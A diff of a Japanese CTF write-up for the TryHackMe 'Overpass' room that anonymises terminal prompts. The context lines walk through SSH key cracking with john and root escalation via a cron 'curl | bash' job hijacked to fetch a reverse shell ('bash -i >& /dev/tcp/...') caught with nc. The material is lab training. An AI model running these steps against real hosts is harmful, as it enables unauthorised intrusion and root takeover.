@@ -5,7 +5,7 @@
 ---
 
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.131.245                                             
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 11:50 +0900
 Nmap scan report for 10.49.131.245
@@ -174,7 +174,7 @@ async function login() {
 
 そして投げると以下が返ってきた
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ curl -i -X POST http://10.49.140.13/api/login \
   -H "Content-Type: application/json" \     
   -d '{"username":"james","password":"wrong"}'
@@ -227,7 +227,7 @@ URLは依然として`/admin`であり、クッキー情報によって異なる
 
 `james`というユーザー名とそのSSH鍵がある
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ cat james.key                                  
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -260,33 +260,33 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
 -----END RSA PRIVATE KEY-----
                                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ 
 ```
 `james.key`という名前で保存し
 `chmod 400 james.key`をして所有ユーザーだけが読み取りできるようにする
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ ll
 合計 13216
--rw-rw-r-- 1 rkametani rkametani    2461  5月 29 09:05 james.hash
--r-------- 1 rkametani rkametani    1766  5月 29 09:03 james.key
--rw-rw-r-- 1 rkametani rkametani    5094  5月 28 13:11 overpass.go
--rw-rw-r-- 1 rkametani rkametani 2708791  5月 28 13:11 overpassFreeBSD
--rwxrwxr-x 1 rkametani rkametani 2722020  5月 28 13:11 overpassLinux
--rw-rw-r-- 1 rkametani rkametani 2692664  5月 28 13:11 overpassMacOS
--rw-rw-r-- 1 rkametani rkametani 2704465  5月 28 13:22 overpassOpenBSD
--rw-rw-r-- 1 rkametani rkametani 2674688  5月 28 13:11 overpassWindows.exe
--rw-rw-r-- 1 rkametani rkametani      37  5月 28 13:06 username.txt
+-rw-rw-r-- 1 kali kali    2461  5月 29 09:05 james.hash
+-r-------- 1 kali kali    1766  5月 29 09:03 james.key
+-rw-rw-r-- 1 kali kali    5094  5月 28 13:11 overpass.go
+-rw-rw-r-- 1 kali kali 2708791  5月 28 13:11 overpassFreeBSD
+-rwxrwxr-x 1 kali kali 2722020  5月 28 13:11 overpassLinux
+-rw-rw-r-- 1 kali kali 2692664  5月 28 13:11 overpassMacOS
+-rw-rw-r-- 1 kali kali 2704465  5月 28 13:22 overpassOpenBSD
+-rw-rw-r-- 1 kali kali 2674688  5月 28 13:11 overpassWindows.exe
+-rw-rw-r-- 1 kali kali      37  5月 28 13:06 username.txt
                                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ 
 
 ```
 
 これを使ってsshログインしようとしたところパスフレーズを求められた
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ ssh -i james.key james@10.49.180.59
 The authenticity of host '10.49.180.59 (10.49.180.59)' can't be established.
 ED25519 key fingerprint is: SHA256:Os+cANqWVUosu3PfRjyDv7+O98oSqn0+sWc3owXPDmA
@@ -319,7 +319,7 @@ SSH秘密鍵を`john`で解析できる形にする
 
 あとはそれをrockyouなど使ってクラックすればよい
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt james.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -332,7 +332,7 @@ james13          (james.key)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ 
 
 ```
@@ -426,16 +426,16 @@ otherでもwriteできることが分かった
 
 まず`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`を参考に場所を作る
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ mkdir www              
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ mkdir www/downloads    
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ mkdir www/downloads/src
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ tree                
 .
 ├── james.hash
@@ -453,37 +453,37 @@ otherでもwriteできることが分かった
 
 4 directories, 9 files
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ 
 
 ```
 偽`buildscript.sh`を作った
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/…/overPass/www/downloads/src]
+┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
 └─$ cat buildscript.sh  
 #!/bin/bash
 bash -i >& /dev/tcp/192.168.205.211/1234 0>&1
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/…/overPass/www/downloads/src]
+┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
 └─$ 
 ```
 
 そして`/www`でpythonサーバーを立てる
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass/www]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass/www]
 └─$ pwd               
-/home/rkametani/tryhackme/overPass/www
+/home/kali/tryhackme/overPass/www
                                                                               
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass/www]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass/www]
 └─$ sudo python3 -m http.server 80             
-[sudo] rkametani のパスワード:
+[sudo] kali のパスワード:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ```
 
 そして別ターミナルでリッスンしておく
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ nc -lvnp 1234             
 listening on [any] 1234 ...
 
@@ -506,7 +506,7 @@ james@ip-10-49-128-6:~$
 ```
 こうすると上記をwriteupに書き込んでいる間にリッスンポートにrootのbashが来た
 ```bash
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/overPass]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
 └─$ nc -lvnp 1234             
 listening on [any] 1234 ...
 connect to [192.168.205.211] from (UNKNOWN) [10.49.128.6] 35416
